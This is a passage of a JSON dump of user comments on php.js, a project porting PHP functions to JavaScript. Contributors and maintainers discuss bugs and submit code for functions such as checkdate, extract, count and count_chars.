Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Pyerre: Thank you :) I've updated the function and also added your example in as a unit test so this can never happen again."},{"date":"2009-06-22 18:38:29","author":"Jorge Vazquez","url":"http:\/\/www.cheats.com.ar","comment":"I've found an error with the code: myDate.setFullYear( year, (month - 1), day ); would only set the year, but not the month nor the day.\n\nI passed the parameters correctly, however only the year part works. I even included leading zeroes to the months after the sustraction. Ultimately I solved it setting the date when you create the variable:\n\n[code]\nnewmonth = (month - 1);\nvar myDate = new Date(year, newmonth , day);\nmyDate.setFullYear(year, newmonth , day);\n[\/code]\n\nI dont know why, maybe it was an error in my PC. However I tried it in many different browsers and it work in any of them."},{"date":"2009-06-23 03:43:30","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Jorge Vazquez:  When I check with the following:\n\n[CODE]checkdate(3, 4, 2009);[\/CODE]\n\nand add an alert to verify the date that has been created:\n\n[CODE]\n    var myDate = new Date();\n    myDate.setFullYear( year, (month - 1), day );\nalert(myDate)\n[\/CODE]\nit works correctly in Firefox, IE, Safari, Opera in showing March 4 as the date...\n\nWhat test data are you using? Please show the exact code so we can identify the problem...\n\nBy the way, I added a few more checks to fit the checkdate() behavior (ensuring the month was between 1 and 12 and the year between 1 and 32767)."},{"date":"2009-06-23 07:33:04","author":"Jorge Vazquez","url":"http:\/\/www.cheats.com.ar","comment":"Disregard my last comment. After extensive testing, I realized this script was working fine. The problem came because I was using jscalendar (http:\/\/www.dynarch.com\/projects\/calendar\/old\/), a useful calendar wich I learned redefines the setFullYear function...\n\nOf course it took me a while to find this out. So, great script, and I'm sorry, my bad!"},{"date":"2012-04-10 09:50:22","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work "}],"chop":[{"date":"2008-12-04 15:03:54","author":"Paulo Ricardo F. Santos","url":"","comment":"@ Kevin: Hmm, now I see that there's no need to send null if charlist is undefined, rtrim() itself should avoid any problems. ;)"},{"date":"2008-12-10 16:47:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: Indeed, let's save us some wasted bytes there. changed."}],"chr":[{"date":"2008-01-02 13:42:52","author":"Kris Brixon","url":"","comment":"Here are a few links to a similar effort from ColdFusion. You may be able to pick up a few functions they wrote.\r\n\r\nhttp:\/\/cfjs.riaforge.org\/\r\nhttp:\/\/www.shlomygantz.com\/customtags\/CFMLjsLibrary\/CfmljsLibrary_beta.htm"},{"date":"2008-01-03 18:44:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Kris: Thanks Kris that's very useful!"},{"date":"2008-03-14 23:38:07","author":"fumbling fellow","url":"","comment":"Thanks for all the hard work!\r\nThis will be very useful to me.\r\n\r\nI can't get your test page to work.\r\nSeems like I had green cells a couple of weeks ago, but now nothing is happening :-("},{"date":"2008-03-15 00:26:30","author":"fumbling fellow","url":"","comment":"Looks like the code is working, the css file is not found so the cells are not changing color.\r\nhttp:\/\/kevin.vanzonneveld.net\/css\/pj_tester.css\r\n\r\nI found the function I was looking for though.\r\nprint_r"},{"date":"2008-03-15 11:51:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ fumbling fellow: Yeah I recently moved the css to a separate file, but I messed up apparently. Thank you, fixed it now!"},{"date":"2009-06-30 09:48:14","author":"Roland Hentschel","url":"","comment":"just a simple way to use this script:\n \n[CODE]\nfunction charmap(font,size) {\n\tif (font==null) font=\"Arial\";\n\tif (size==null) size=24;\n\tdocument.write(\"<style>\\n\"+\n\t\"* { font:normal bold \"+size+\"pt \"+font+\"; }\\n\"+\n\t\"td { text-align:center; }\\n\"+\n\t\"<\/style>\\n\");\n\tdocument.write(\"<table>\\n\");\n\tfor (x=0;x<16;x++) {\n\t\tdocument.write(\"<tr>\\n\");\n\t\tfor (y=0;y<16;y++) {\n\t\t\tdocument.write(\"<td>\"+chr(16*x+y)+\"<\/td>\\n\");\n\t\t}\n\t\tdocument.write(\"<\/tr>\\n\");\n\t}\n\tdocument.write(\"<\/table>\\n\");\n}\n[\/CODE]"},{"date":"2009-06-30 11:36:07","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Nice one, thanks Roland. Used the same approach in my LGPL Firefox Unicode chart view extension - https:\/\/addons.mozilla.org\/en-US\/firefox\/addon\/5235 (I should make an HTML 5 version of that one if somebody else doesn't, now that SQL can be used client-side to store character descriptions.)\n\nAnyhow, Kevin, what do you think of a public wiki for demos of code like this one? We keep getting asked for demos, so maybe our users would like a little workspace for stuff like this (or derivatives of the functions, etc.). Wouldn't replace the compiler, and central review is still helpful, but we might see others be able to help out a little with introduction, offering special tricks, etc. What do you think?"},{"date":"2009-07-03 13:55:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Ok i'm definitely cool with that. Just need to figure out what wiki to use and how to nicely integrate it into this site (cakephp). any suggestions are welcome"},{"date":"2009-07-04 01:16:43","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"I'm quite partial to Mediawiki. Well-tested, familiar syntax (at least among wikis), easy to install, extensible, well-supported by the community, etc. See http:\/\/www.mediawiki.org\/wiki\/Download and links on the page for 'how-to' articles such as customizing the logo, etc. (e.g., http:\/\/www.mediawiki.org\/wiki\/Manual:Skins and  http:\/\/www.mediawiki.org\/wiki\/Manual:Gallery_of_user_styles )"},{"date":"2009-07-08 16:30:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Mediawiki it is! I installed a basic version in \/wiki. Will link to it from the navigation once we have some goodness to show for it."}],"chunk_split":[{"date":"2008-12-01 15:11:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: I added two hello world examples and ran them first in PHP. It seems the output strays a little bit from our current implementation: php adds a suffixing '*'."},{"date":"2008-12-01 15:25:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: Ignore that. It works beautifully ;)"},{"date":"2008-12-01 17:04:23","author":"Paulo Ricardo F. Santos","url":"","comment":"@ Kevin: No problem. :)"}],"compact":[{"date":"2008-02-06 15:04:39","author":"Karol Kowalski","url":"","comment":"This version is not recursive as it should be acc to the php manual. Try run following example (taken from the manual, too):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar city  = &quot;San Francisco&quot;;\r\nvar state = &quot;CA&quot;;\r\nvar event = &quot;SIGGRAPH&quot;;\r\n\r\nvar location_vars = new Array(&quot;city&quot;, &quot;state&quot;);\r\n\r\nvar result = compact(&quot;event&quot;, &quot;nothing_here&quot;, &quot;location_vars&quot;);\r\n\r\nconsole.log(result)\r\n[\/CODE]\r\n\r\nWhat you get is an object with event property and location_vars property which is an Array. What should be returned is a 'flat' object with event, city and state properties (because location_vars) should be searched inside."},{"date":"2008-12-03 17:53:53","author":"Brett Zamir","url":"","comment":"Again, adapting the PHP manual's examples, here is an equivalent for extract():\r\n\r\n[CODE=&quot;Javascript&quot;]var size = &quot;large&quot;;\r\nvar var_array = {&quot;color&quot; : &quot;blue&quot;,\r\n                   &quot;size&quot; : &quot;medium&quot;,\r\n                   &quot;shape&quot; : &quot;sphere&quot;};\r\nextract(var_array, 'EXTR_PREFIX_SAME', &quot;wddx&quot;);\r\n\r\nalert([color, size, shape, wddx_size].join()); \/\/ blue,large,sphere,medium[\/CODE]\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]\/\/ Only works on global variables\r\n\r\nfunction extract (arr, type, prefix) {\r\n    for (var i in arr) {\r\n        switch (type) {\r\n            case 'EXTR_PREFIX_SAME' || 2:\r\n                if (window[i] !== undefined) {\r\n                   window[prefix+'_'+i] = arr[i];\r\n               }\r\n               \/\/ Fall-through\r\n            case 'EXTR_SKIP' || 1:\r\n               if (window[i] === undefined) {\r\n                   window[i] = arr[i];\r\n               }\r\n               break;\r\n            case 'EXTR_PREFIX_ALL' || 3:\r\n               window[prefix+'_'+i] = arr[i];\r\n               break;\r\n            case 'EXTR_PREFIX_INVALID' || 4:\r\n               if(i.match(\/^[_a-zA-Z$][\\w|$]*$\/) != null) { \/\/ Refine regexp to allow JS 1.5+ Unicode identifiers\r\n                   window[i] = arr[i];\r\n               }\r\n               else {\r\n                   window[prefix+'_'+i] = arr[i];\r\n               }\r\n               break;\r\n            case 'EXTR_IF_EXISTS' || 6:\r\n               if (window[i] !== undefined) {\r\n                   window[i] = arr[i];\r\n               }\r\n               break;\r\n            case 'EXTR_PREFIX_IF_EXISTS' || 5:\r\n               if (window[i] !== undefined) {\r\n                   window[prefix+'_'+i] = arr[i];\r\n               }\r\n               break;\r\n            case 'EXTR_REFS' || 256:\r\n               throw 'The EXTR_REFS type will not work in JavaScript';\r\n               break;\r\n            case 'EXTR_OVERWRITE' || 0:\r\n                \/\/ Fall-through\r\n            default:\r\n                window[i] = arr[i];\r\n                break;\r\n          }\r\n    }\r\n}[\/CODE]"},{"date":"2012-04-17 15:28:17","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work. \n"}],"constant":[{"date":"2010-06-19 18:06:27","author":"Paulo Freitas","url":"","comment":"Hmm, this one should require get_defined_constants(), no? When I wrote I think that the get_defined_constants() doesn't exist yet, but for now it should be useful to do things like constant('DATE_W3C'). :)"},{"date":"2010-06-21 04:50:35","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Paulo: I think Kevin wants to avoid automatically importing PHP constants (whether as globals or on the namespaced object). If a user wants them, they can follow the notes at http:\/\/phpjs.org\/functions\/get_defined_constants:839 to get them in scope, but this function constant() could still be useful without them in the case of user-defined constants."}],"cos":[{"date":"2008-10-11 00:33:31","author":"Christian Doebler","url":"www.tinxx.de","comment":"function sleep (seconds) {\r\n\tseconds *= 1000;\r\n\tvar start = new Date().getTime();\r\n\twhile (new Date().getTime() &lt; start + seconds);\r\n}"},{"date":"2008-10-13 11:31:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Christian Doebler: Thank you. I've added the function for study purposes. Because I think this implementation will lock up the browser, resulting in an unpleasant user experience. If you feel differently, please let me know."}],"count":[{"date":"2008-01-09 22:38:16","author":"Philippe Baumann","url":"","comment":"Cool project, really.\r\n\r\nHere's one of my conversions:\r\n[CODE=&quot;Javascript&quot;]\r\n\/*\r\n *  bool empty ( mixed $var )\r\n *\r\n *  The following things are considered to be empty: \r\n *  &quot;&quot; (an empty string)\r\n *  0 (0 as an integer)\r\n *  &quot;0&quot; (0 as a string)\r\n *  NULL\r\n *  FALSE\r\n *  array() (an empty array)\r\n *  var $var; (a variable declared, but without a value in a class)\r\n *\/\r\n\r\nfunction empty(variable)\r\n{\r\n\tif( variable === &quot;&quot; || variable === 0 \t|| variable === &quot;0&quot; || variable === null\t|| variable === false\t||\t( is_array(variable) &amp;&amp; variable.length === 0 ) )\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n}\r\n[\/CODE]\r\nFeel free to improve, edit, change the format, etc."},{"date":"2008-01-10 07:56:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philippe Baumann: Great contribution. I'll add it right away, thanks alot!"},{"date":"2008-01-22 19:59:15","author":"Ates Goral","url":"","comment":"Here's count_chars():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction count_chars(str, mode) {\r\n    \/\/ *     example 1: count_chars(&quot;Hello World!&quot;);\r\n    \/\/ *     returns 1: {1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0, 16:0, 17:0, 18:0, 19:0, 20:0, 21:0, 22:0, 23:0, 24:0, 25:0, 26:0, 27:0, 28:0, 29:0, 30:0, 31:0, 32:1, 33:1, 34:0, 35:0, 36:0, 37:0, 38:0, 39:0, 40:0, 41:0, 42:0, 43:0, 44:0, 45:0, 46:0, 47:0, 48:0, 49:0, 50:0, 51:0, 52:0, 53:0, 54:0, 55:0, 56:0, 57:0, 58:0, 59:0, 60:0, 61:0, 62:0, 63:0, 64:0, 65:0, 66:0, 67:0, 68:0, 69:0, 70:0, 71:0, 72:1, 73:0, 74:0, 75:0, 76:0, 77:0, 78:0, 79:0, 80:0, 81:0, 82:0, 83:0, 84:0, 85:0, 86:0, 87:1, 88:0, 89:0, 90:0, 91:0, 92:0, 93:0, 94:0, 95:0, 96:0, 97:0, 98:0, 99:0, 100:1, 101:1, 102:0, 103:0, 104:0, 105:0, 106:0, 107:0, 108:3, 109:0, 110:0, 111:2, 112:0, 113:0, 114:1, 115:0, 116:0, 117:0, 118:0, 119:0, 120:0, 121:0, 122:0, 123:0, 124:0, 125:0, 126:0, 127:0, 128:0, 129:0, 130:0, 131:0, 132:0, 133:0, 134:0, 135:0, 136:0, 137:0, 138:0, 139:0, 140:0, 141:0, 142:0, 143:0, 144:0, 145:0, 146:0, 147:0, 148:0, 149:0, 150:0, 151:0, 152:0, 153:0, 154:0, 155:0, 156:0, 157:0, 158:0, 159:0, 160:0, 161:0, 162:0, 163:0, 164:0, 165:0, 166:0, 167:0, 168:0, 169:0, 170:0, 171:0, 172:0, 173:0, 174:0, 175:0, 176:0, 177:0, 178:0, 179:0, 180:0, 181:0, 182:0, 183:0, 184:0, 185:0, 186:0, 187:0, 188:0, 189:0, 190:0, 191:0, 192:0, 193:0, 194:0, 195:0, 196:0, 197:0, 198:0, 199:0, 200:0, 201:0, 202:0, 203:0, 204:0, 205:0, 206:0, 207:0, 208:0, 209:0, 210:0, 211:0, 212:0, 213:0, 214:0, 215:0, 216:0, 217:0, 218:0, 219:0, 220:0, 221:0, 222:0, 223:0, 224:0, 225:0, 226:0, 227:0, 228:0, 229:0, 230:0, 231:0, 232:0, 233:0, 234:0, 235:0, 236:0, 237:0, 238:0, 239:0, 240:0, 241:0, 242:0, 243:0, 244:0, 245:0, 246:0, 247:0, 248:0, 249:0, 250:0, 251:0, 252:0, 253:0, 254:0, 255:0}\r\n    \/\/ *     example 2: count_chars(&quot;Hello World!&quot;, 0);\r\n    \/\/ *     returns 2: {1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0, 16:0, 17:0, 18:0, 19:0, 20:0, 21:0, 22:0, 23:0, 24:0, 25:0, 26:0, 27:0, 28:0, 29:0, 30:0, 31:0, 32:1, 33:1, 34:0, 35:0, 36:0, 37:0, 38:0, 39:0, 40:0, 41:0, 42:0, 43:0, 44:0, 45:0, 46:0, 47:0, 48:0, 49:0, 50:0, 51:0, 52:0, 53:0, 54:0, 55:0, 56:0, 57:0, 58:0, 59:0, 60:0, 61:0, 62:0, 63:0, 64:0, 65:0, 66:0, 67:0, 68:0, 69:0, 70:0, 71:0, 72:1, 73:0, 74:0, 75:0, 76:0, 77:0, 78:0, 79:0, 80:0, 81:0, 82:0, 83:0, 84:0, 85:0, 86:0, 87:1, 88:0, 89:0, 90:0, 91:0, 92:0, 93:0, 94:0, 95:0, 96:0, 97:0, 98:0, 99:0, 100:1, 101:1, 102:0, 103:0, 104:0, 105:0, 106:0, 107:0, 108:3, 109:0, 110:0, 111:2, 112:0, 113:0, 114:1, 115:0, 116:0, 117:0, 118:0, 119:0, 120:0, 121:0, 122:0, 123:0, 124:0, 125:0, 126:0, 127:0, 128:0, 129:0, 130:0, 131:0, 132:0, 133:0, 134:0, 135:0, 136:0, 137:0, 138:0, 139:0, 140:0, 141:0, 142:0, 143:0, 144:0, 145:0, 146:0, 147:0, 148:0, 149:0, 150:0, 151:0, 152:0, 153:0, 154:0, 155:0, 156:0, 157:0, 158:0, 159:0, 160:0, 161:0, 162:0, 163:0, 164:0, 165:0, 166:0, 167:0, 168:0, 169:0, 170:0, 171:0, 172:0, 173:0, 174:0, 175:0, 176:0, 177:0, 178:0, 179:0, 180:0, 181:0, 182:0, 183:0, 184:0, 185:0, 186:0, 187:0, 188:0, 189:0, 190:0, 191:0, 192:0, 193:0, 194:0, 195:0, 196:0, 197:0, 198:0, 199:0, 200:0, 201:0, 202:0, 203:0, 204:0, 205:0, 206:0, 207:0, 208:0, 209:0, 210:0, 211:0, 212:0, 213:0, 214:0, 215:0, 216:0, 217:0, 218:0, 219:0, 220:0, 221:0, 222:0, 223:0, 224:0, 225:0, 226:0, 227:0, 228:0, 229:0, 230:0, 231:0, 232:0, 233:0, 234:0, 235:0, 236:0, 237:0, 238:0, 239:0, 240:0, 241:0, 242:0, 243:0, 244:0, 245:0, 246:0, 247:0, 248:0, 249:0, 250:0, 251:0, 252:0, 253:0, 254:0, 255:0}\r\n    \/\/ *     example 3: count_chars(&quot;Hello World!&quot;, 1);\r\n    \/\/ *     returns 3: {72:1, 101:1, 108:3, 111:2, 32:1, 87:1, 114:1, 100:1, 33:1}\r\n    \/\/ *     example 4: count_chars(&quot;Hello World!&quot;, 2);\r\n    \/\/ *     returns 4: {1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0, 10:0, 11:0, 12:0, 13:0, 14:0, 15:0, 16:0, 17:0, 18:0, 19:0, 20:0, 21:0, 22:0, 23:0, 24:0, 25:0, 26:0, 27:0, 28:0, 29:0, 30:0, 31:0, 34:0, 35:0, 36:0, 37:0, 38:0, 39:0, 40:0, 41:0, 42:0, 43:0, 44:0, 45:0, 46:0, 47:0, 48:0, 49:0, 50:0, 51:0, 52:0, 53:0, 54:0, 55:0, 56:0, 57:0, 58:0, 59:0, 60:0, 61:0, 62:0, 63:0, 64:0, 65:0, 66:0, 67:0, 68:0, 69:0, 70:0, 71:0, 73:0, 74:0, 75:0, 76:0, 77:0, 78:0, 79:0, 80:0, 81:0, 82:0, 83:0, 84:0, 85:0, 86:0, 88:0, 89:0, 90:0, 91:0, 92:0, 93:0, 94:0, 95:0, 96:0, 97:0, 98:0, 99:0, 102:0, 103:0, 104:0, 105:0, 106:0, 107:0, 109:0, 110:0, 112:0, 113:0, 115:0, 116:0, 117:0, 118:0, 119:0, 120:0, 121:0, 122:0, 123:0, 124:0, 125:0, 126:0, 127:0, 128:0, 129:0, 130:0, 131:0, 132:0, 133:0, 134:0, 135:0, 136:0, 137:0, 138:0, 139:0, 140:0, 141:0, 142:0, 143:0, 144:0, 145:0, 146:0, 147:0, 148:0, 149:0, 150:0, 151:0, 152:0, 153:0, 154:0, 155:0, 156:0, 157:0, 158:0, 159:0, 160:0, 161:0, 162:0, 163:0, 164:0, 165:0, 166:0, 167:0, 168:0, 169:0, 170:0, 171:0, 172:0, 173:0, 174:0, 175:0, 176:0, 177:0, 178:0, 179:0, 180:0, 181:0, 182:0, 183:0, 184:0, 185:0, 186:0, 187:0, 188:0, 189:0, 190:0, 191:0, 192:0, 193:0, 194:0, 195:0, 196:0, 197:0, 198:0, 199:0, 200:0, 201:0, 202:0, 203:0, 204:0, 205:0, 206:0, 207:0, 208:0, 209:0, 210:0, 211:0, 212:0, 213:0, 214:0, 215:0, 216:0, 217:0, 218:0, 219:0, 220:0, 221:0, 222:0, 223:0, 224:0, 225:0, 226:0, 227:0, 228:0, 229:0, 230:0, 231:0, 232:0, 233:0, 234:0, 235:0, 236:0, 237:0, 238:0, 239:0, 240:0, 241:0, 242:0, 243:0, 244:0, 245:0, 246:0, 247:0, 248:0, 249:0, 250:0, 251:0, 252:0, 253:0, 254:0, 255:0}\r\n    \/\/ *     example 5: count_chars(&quot;Hello World!&quot;, 3);\r\n    \/\/ *     returns 5: &quot;Helo Wrd!&quot;\r\n    \/\/ *     example 6: count_chars(&quot;Hello World!&quot;, 4);\r\n    \/\/ *     returns 6: &quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\b \\n\\v\\f\\r\\x0E\\x0F\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F\\&quot;#$%&amp;'()*+,-.\/0123456789:;&lt;=&gt;?@ABCDEFGIJKLMNOPQRSTUVXYZ[\\\\]^_`abcfghijkmnpqstuvwxyz{|}~\\x7F\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F\\xA0\\xA1\\xA2\\xA3\\xA4\\xA5\\xA6\\xA7\\xA8\\xA9\\xAA\\xAB\\xAC\\xAD\\xAE\\xAF\\xB0\\xB1\\xB2\\xB3\\xB4\\xB5\\xB6\\xB7\\xB8\\xB9\\xBA\\xBB\\xBC\\xBD\\xBE\\xBF\\xC0\\xC1\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7\\xC8\\xC9\\xCA\\xCB\\xCC\\xCD\\xCE\\xCF\\xD0\\xD1\\xD2\\xD3\\xD4\\xD5\\xD6\\xD7\\xD8\\xD9\\xDA\\xDB\\xDC\\xDD\\xDE\\xDF\\xE0\\xE1\\xE2\\xE3\\xE4\\xE5\\xE6\\xE7\\xE8\\xE9\\xEA\\xEB\\xEC\\xED\\xEE\\xEF\\xF0\\xF1\\xF2\\xF3\\xF4\\xF5\\xF6\\xF7\\xF8\\xF9\\xFA\\xFB\\xFC\\xFD\\xFE\\xFF&quot;\r\n    \t\r\n\tvar histogram = new Object();\r\n\r\n\tif (arguments.length == 1) {\r\n\t\tmode = 0;\r\n\t}\r\n\t\r\n\tvar mode_even = (mode &amp; 1) == 0;\r\n\t\r\n\tif (mode_even) {\r\n\t\tfor (var i = 1; i &lt; 256; ++i) {\r\n\t\t\thistogram[i] = 0;\r\n\t\t}\r\n\t}\r\n\t\r\n\tfor (var i = 0; i &lt; str.length; ++i) {\r\n\t\tvar code = str.charCodeAt(i);\r\n\t\t\r\n\t\tif (code in histogram) {\r\n\t\t\t++histogram[code];\r\n\t\t} else {\r\n\t\t\thistogram[code] = 1;\r\n\t\t}\r\n\t}\r\n\r\n\tif (mode &gt; 0) {\r\n\t\tfor (var key in histogram) {\r\n\t\t\tif (histogram[key] == 0 ^ mode_even) {\r\n\t\t\t\tdelete histogram[key];\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\tif (mode &lt; 3) {\r\n\t\treturn histogram;\r\n\t} else {\r\n\t\tvar ret = new Array();\r\n\t\t\r\n\t\tfor (var key in histogram) {\r\n\t\t\tret.push(String.fromCharCode(key));\r\n\t\t}\r\n\t\t\r\n\t\treturn ret.join(&quot;&quot;);\r\n\t}\r\n}\r\n[\/CODE]\r\n\r\nI demand an extra gold medal for using a cryptic logical XOR inside an if statement ;)"},{"date":"2008-01-22 20:05:49","author":"Ates Goral","url":"","comment":"I take my demand for the extra gold medal back :) I realized that I could have just used a simple &quot;not equal&quot; instead of the XOR:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif (histogram[key] == 0 != mode_even)\r\n[\/CODE]"},{"date":"2008-01-22 21:19:47","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Great coding skills AND a sense of humor all in one person? Why you Should demand more gold medals ;)\r\n\r\nBut good idea anyway, let's program that the no.1 gets 2 medals in front of his name."},{"date":"2009-04-28 10:47:46","author":"Soren Hansen","url":"","comment":"count('teststring'); \/\/ Should return 1 according to the \r\nIt currently returns 10\r\n\r\nCould be optimized by applying something like this in  the beginning of the function:\r\n[CODE]\r\nif(mixed_var === null){\r\n return 0;\r\n} else if(mixed_var.constructor !== Array || mixed_var.constructor !== Object){\r\n return 1;\r\n}\r\n[\/CODE]"},{"date":"2009-04-28 10:49:43","author":"Soren Hansen","url":"","comment":"Small mistake, should off course be\r\n[CODE]\r\nif(mixed_var === null){ \r\nreturn 0; \r\n} else if(mixed_var.constructor !== Array && mixed_var.constructor !== Object){ \r\nreturn 1; \r\n}\r\n[\/CODE]"},{"date":"2009-04-30 09:41:56","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Fixed in SVN, thanks!"},{"date":"2010-04-18 14:46:31","author":"merabi","url":"","comment":"this function has some issue:\nwhen  i want to count elements in array, this function counts the functions in it.\n\nfor example in jQuery's array (jQuery appends \"remove\" element in all array) this function counts the \"remove\" element too, and it is wrong!\n\ni remade function:\n[code]\nfunction count( mixed_var, mode ) {\n    var key, cnt = 0;\n    if( mode == 'COUNT_RECURSIVE' ) mode = 1;\n    if( mode != 1 ) mode = 0;\n    for (key in mixed_var){\n    \tif(typeof(mixed_var[key]) != \"function\"){\n\t        cnt++;\n\t        if( mode==1 && mixed_var[key] && (mixed_var[key].constructor === Array || mixed_var[key].constructor === Object) ){\n\t            cnt += count(mixed_var[key], 1);\n\t        }\n    \t}\n    }\n    return cnt;\n}\n[\/code]"},{"date":"2010-04-19 04:34:44","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@merabi: Thanks for your input on this. We really do need to go through our functions and do more for...in filtering. I have made a change at http:\/\/github.com\/kvz\/phpjs\/commit\/d7a15ad7c41914bdfdf56e5db4b0ffebd7dfaecb , but note that I have tested for hasOwnProperty instead of excluding functions as in your version.  This is because one may sometimes wish to deliberately pass around functions as data. By checking against hasOwnProperty, we exclude functions (and properties) which are defined on the prototype (and less likely to be intended as data), but not those on the specific object instance.\n\nFor example:\n\n[CODE]function Class () {\n    this.objMethod = function () {};\n}\nClass.prototype.method = function () {};\nvar c = new Class();\n\nfor (var p in c) {\n\/\/ iterates \"objMethod\" but not \"method\"\n}[\/CODE]\n\nSo if jQuery's remove works like described at http:\/\/ejohn.org\/blog\/javascript-array-remove\/ , you'll be ok there.\n\nIt is usually a good idea to define methods on the prototype because they will be shared across all inheriting objects, thus reducing memory load, while defining a method on each instance (as with \"objMethod\" above) creates a new function copy for each object instance and increases memory usage.\n\nHowever, on regular arrays or object literals, the functions will be counted:\n\n[CODE]\nvar a = {b: function () {}}; \/\/ We don't exclude 'b' because we don't know if someone meant it as data for their \"associative array\"\nvar a = [function (){alert('a');}, function () {alert('b');}];\n[\/CODE]\n\nBoth of the above will still have the functions iterated by our version of count() since, again, some people want functions as data, as it is a particularly convenient feature of JS to be able to use them this way. Admittedly, for objects, it is less clear that the person intends them to be treated as data, but since our model in php.js is for object literals to be treated similarly to PHP associative arrays (as far as JS allows us at least), we have to allow for the possibility that someone intended a function there as data too."},{"date":"2011-04-29 22:47:22","author":"Marc","url":"http:\/\/www.tagesgeldforum.de\/","comment":"my proposal:\n\nShorten:\n[code]\tif (mode === 'COUNT_RECURSIVE') {\n\t\tmode = 1;\n\t}\n\tif (mode != 1) {\n\t\tmode = 0;\n\t}[\/code]\n\nto:\n[code]\tmode = mode !== 'COUNT_RECURSIVE' ? 0 : 1;[\/code]"},{"date":"2011-04-30 09:00:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Marc: That would be fine for the string value, but we also want to allow \"1\" to be passed as a numeric value."}],"count_chars":[{"date":"2008-01-22 21:28:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Wicked Ates! Unfortunately there is one thing at example 6:\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ *     example 6: count_chars(&quot;Hello World!&quot;, 4);\r\n    \/\/ *     returns 6: &quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\b \\n\\v\\f\\r\\x0E\\x0F\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F\\&quot;#$%&amp;'()*+,-.\/0123456789:;&lt;=&gt;?@ABCDEFGIJKLMNOPQRSTUVXYZ[\\\\]^_`abcfghijkmnpqstuvwxyz{|}~\\x7F\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F\\xA0\\xA1\\xA2\\xA3\\xA4\\xA5\\xA6\\xA7\\xA8\\xA9\\xAA\\xAB\\xAC\\xAD\\xAE\\xAF\\xB0\\xB1\\xB2\\xB3\\xB4\\xB5\\xB6\\xB7\\xB8\\xB9\\xBA\\xBB\\xBC\\xBD\\xBE\\xBF\\xC0\\xC1\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7\\xC8\\xC9\\xCA\\xCB\\xCC\\xCD\\xCE\\xCF\\xD0\\xD1\\xD2\\xD3\\xD4\\xD5\\xD6\\xD7\\xD8\\xD9\\xDA\\xDB\\xDC\\xDD\\xDE\\xDF\\xE0\\xE1\\xE2\\xE3\\xE4\\xE5\\xE6\\xE7\\xE8\\xE9\\xEA\\xEB\\xEC\\xED\\xEE\\xEF\\xF0\\xF1\\xF2\\xF3\\xF4\\xF5\\xF6\\xF7\\xF8\\xF9\\xFA\\xFB\\xFC\\xFD\\xFE\\xFF&quot;\r\n[\/CODE]\r\nIt pretty much destroyed the tester-page because of all the messed up characters so for now I had to exclude it :( Other than that... awesome :)"},{"date":"2008-03-02 18:24:56","author":"Michael White","url":"","comment":"Not sure exactly what is causing it but I found a bug in Opera 9.20 where the output of example 1 is incorrect.\r\n&lt;br \/&gt;\r\nOpera: !HWdelor\r\n&lt;br \/&gt;\r\nOther browsers: Helo Wrd!\r\n&lt;br \/&gt;\r\nStrange bug. If I find a fix I'll post 